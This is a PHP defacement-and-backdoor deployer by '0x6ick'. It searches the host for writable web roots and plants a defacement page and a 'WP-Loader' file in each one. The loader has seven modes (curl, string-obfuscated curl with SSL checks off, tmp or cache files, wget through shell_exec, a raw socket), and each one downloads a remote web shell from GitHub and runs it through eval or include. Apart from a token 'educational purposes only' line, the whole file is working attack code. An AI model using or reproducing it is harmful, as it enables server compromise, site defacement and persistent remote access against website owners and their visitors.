<?php
//crotdikit
//t.me/yungx6ick
ini_set('display_errors', 1);
error_reporting(E_ALL);

$folderName = '6z';
$files = [
    'index.html' => genHTML(),
    'info.htm'   => genHTML(),
    'readme.txt' => genTXT(),
    'loadme.php' => genPHP()
];

function locateRoots($start){
    $roots=[];
    $dir=realpath($start);
    while($dir && $dir!=='/'){
        if(is_dir($dir."/public_html")) $roots[]=$dir."/public_html";
        foreach(glob($dir."/*",GLOB_ONLYDIR) as $sub){
            if(preg_match('/\.[a-z]+$/',basename($sub))) $roots[]=$sub;
        }
        $dir=dirname($dir);
    }
    return array_unique($roots);
}


function deployFolder($folderName,$files){
    $roots=locateRoots(__DIR__); $deployed=[];
    foreach($roots as $htmlPath){
        if(is_writable($htmlPath)){
            $targetDir="$htmlPath/$folderName";
            if(!is_dir($targetDir))@mkdir($targetDir,0777,true);
            foreach($files as $n=>$c){
                if(@file_put_contents("$targetDir/$n",$c) !== false){
                    $deployed[]=$targetDir.'/'.$n;
                }
            }
        }
    }
    return $deployed;
}

function genHTML(){
    return <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Stamped by 0x6ick</title>
<link rel="icon" href="https://0x6ick.my.id/favicon.ico" type="image/x-icon">
<style>
body{margin:0;padding:0;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:monospace;background:#fff;color:#333;text-align:center}
img{max-width:250px;border-radius:10px;margin-bottom:15px}
h1{color:#00bcd4;margin:5px 0}
h2{color:#f50057;margin:5px 0 15px}
p{margin:8px 0;font-size:14px}
.footer{position:fixed;bottom:10px;left:0;width:100%;text-align:center;font-size:13px;color:#00bcd4}
a{color:#00bcd4;text-decoration:none}
</style>
</head>
<body>
<div class="content">
<img src="https://i.imgur.com/y7BGFy3.jpeg" alt="image">
<h1>StampeD by 0x6ick</h1>
<h2>Ex 5YN15T3R_742</h2>
<p>6ickZone: Where creativity, exploitation, and expression collide.</p>
</div>
<a href="https://linktr.ee/6ickzone" target="_blank">MyLink</a>
<div class="footer">0x6ick - 6ickZone</div>
</body>
</html>
HTML;
}

function genTXT(){
    return "Stamped by 0x6ick - 6ickZone\n5YN15T3R_742";
}

function genPHP(){
    return <<<'PHP'
<?php
/**
 * WP-Loader.php
 *
 * Universal PHP Loader Collection
 *
 * @package   WP-Loader
 * @author    0x6ick <spamersuy13@gmail.com>
 * @license   DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE (WTFPL) v2
 * @version   1.0.0
 * @link      http://www.wtfpl.net
 *
 * This program is free software. It comes without any warranty, to
 * the extent permitted by applicable law. You can redistribute it
 * and/or modify it under the terms of the Do What The Fuck You Want
 * To Public License, Version 2, as published by Sam Hocevar.
 *
 *     DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
 *     TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
 *
 *     0. You just DO WHAT THE FUCK YOU WANT TO.
 */
session_start();

@ini_set('display_errors', 0);
@set_time_limit(0);
@error_reporting(0);

if (isset($_GET['mode'])) {
    $_SESSION['loader_mode'] = $_GET['mode'];
}

$mode = $_SESSION['loader_mode'] ?? 'help';

if ($mode === 'help') {
    session_unset();
}

switch($mode){

    // --- Loader 1: cURL ---
    case "curl":
        $url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/VoidGateDx.php';
        $code = @file_get_contents($url);
        if ($code === false || empty($code)) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($ch, CURLOPT_TIMEOUT, 20);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Script)');
            $code = curl_exec($ch);
            curl_close($ch);
        }
        if ($code) eval("?>$code");
        break;

    // --- Loader 2: Refactored cURL ---
    case "curlman":
        function load_content(){
            $part1 = 'ht' . 'tps://' . 'raw.' . 'github' . 'usercontent' . '.com/';
            $part2 = '6ickzone' . '/0x6ickShell-Manager/';
            $part3 = 'refs/' . 'heads/' . 'main/';
            $part4 = 'yami.php';
            $target_url = $part1.$part2.$part3.$part4;
            $data = '';
            if(function_exists('curl_init')){
                $ch = curl_init($target_url);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_CONNECTTIMEOUT => 5,
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_SSL_VERIFYPEER => 0,
                    CURLOPT_SSL_VERIFYHOST => 0,
                    CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; StealthLoader/1.0)'
                ]);
                $data = curl_exec($ch);
                curl_close($ch);
            }
            if(empty($data)) $data = @file_get_contents($target_url);
            if($data) eval("?>$data");
        }
        load_content();
        break;

    // --- Loader 3: TMP File ---
    case "tmp":
        $payload_url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/bypass.php';
        $tmp_path = '/tmp/.sess_' . substr(md5($_SERVER['HTTP_HOST']), 0, 10) . '.php';
        if (isset($_GET['reload']) || !file_exists($tmp_path) || filesize($tmp_path) == 0) {
            $payload = file_get_contents($payload_url);
            if (stripos($payload, '<?php') !== false) {
                file_put_contents($tmp_path, $payload);
                usleep(300000);
            }
        }
        if (file_exists($tmp_path) && filesize($tmp_path) > 0) include_once($tmp_path);
        break;

    // --- Loader 4: Cache File ---
    case "cache":
        $tmp = 'cache_ym.php';
        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/yami.php';
        if (!file_exists($tmp) || filesize($tmp) < 10) {
            $code = file_get_contents($url);
            file_put_contents($tmp, $code);
        }
        include($tmp);
        unlink($tmp);
        break;
        
    // --- Loader 5: cURL v2 ---
    case "curlv2":
        $Url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/void.php';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $Url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        curl_close($ch);
        if ($output) {
            eval('?>'.$output);
        }
        break;

    // --- Loader 6: WGET + Include ---
    case "wget":
        $url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/simplebypass.php';
        $tmp_file = '/tmp/sess_'.md5($url).'.php';
        
        if(is_executable('/usr/bin/wget')) {
            $command = "/usr/bin/wget -q -O $tmp_file $url";
        } else {
            $command = "/usr/bin/curl -s -o $tmp_file $url";
        }
        
        @shell_exec($command);
        
        if (file_exists($tmp_file) && filesize($tmp_file) > 0) {
            include($tmp_file);
            unlink($tmp_file);
        } else {
            echo "Error: Failed to download file or shell_exec is disabled.";
        }
        break;

    // --- Loader 7: Socket ---
    case "socket":
        $host = 'raw.githubusercontent.com';
        $path = '/6ickzone/0x6ickShell-Manager/refs/heads/main/yami.php';
        $port = 443;
        
        $fp = @fsockopen("ssl://" . $host, $port, $errno, $errstr, 10);
        
        if ($fp) {
            $out = "GET $path HTTP/1.1\r\n";
            $out .= "Host: $host\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);
            
            $response = '';
            while (!feof($fp)) {
                $response .= fgets($fp, 128);
            }
            fclose($fp);
            
            $body = substr($response, strpos($response, "\r\n\r\n") + 4);
            
            if (!empty($body)) {
                eval("?>$body");
            } else {
                echo "Error: Failed to get content via socket.";
            }
        } else {
            echo "Error: Could not open socket to $host ($errstr)";
        }
        break;
    
    // --- Contact / Credits ---
    case "telegram":
        echo '<div style="font-family: monospace; text-align: center; margin-top: 20px;">';
        echo '<strong>WARNING! This tool is for educational purposes only.</strong><br><br>';
        echo 'Contact Author:<br>';
        echo '<a href="https://t.me/Yungx6ick" target="_blank" style="color: lightblue; text-decoration: underline;">6ickzone</a>';
        echo '<br><br><a href="?mode=help" style="color: white;">&larr; Back to Menu</a>';
        echo '</div>';
        break;


    // --- MAIN MENU ---
    default:
        echo "<h3>Loader Panel</h3>";
        echo "Select loader mode via ?mode=<br>";
        echo "- <a href='?mode=curl'>curl</a><br>";
        echo "- <a href='?mode=curlman'>curlman (refactored)</a><br>";
        echo "- <a href='?mode=tmp'>tmp</a><br>";
        echo "- <a href='?mode=cache'>cache</a><br>";
        echo "- <a href='?mode=curlv2'>curlv2</a><br>";
        echo "- <a href='?mode=wget'>wget</a><br>";
        echo "- <a href='?mode=socket'>socket</a><br>";
        echo "- <a href='?mode=telegram'>Author / Contact</a><br>";
        echo "<hr>To return to this menu, use <a href='?mode=help'>?mode=help</a>";
}

?>
PHP;
}

// ---------------- Main Logic ----------------

$deployResult = deployFolder($folderName, $files);
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Deployment Result</title>
<style>
body {
    font-family: monospace;
    background: #111;
    color: #0f0;
    padding: 20px;
}
pre {
    white-space: pre-wrap;
}
</style>
</head>
<body>
<pre>
Deployment Complete!

<?= empty($deployResult) ? '⚠️ No deployment done. Maybe no writable paths?' : '✅ Files deployed to:' ?>

<?php foreach($deployResult as $url): ?>
<?= htmlspecialchars($url) ?>
<?php endforeach; ?>
</pre>
</body>
</html>
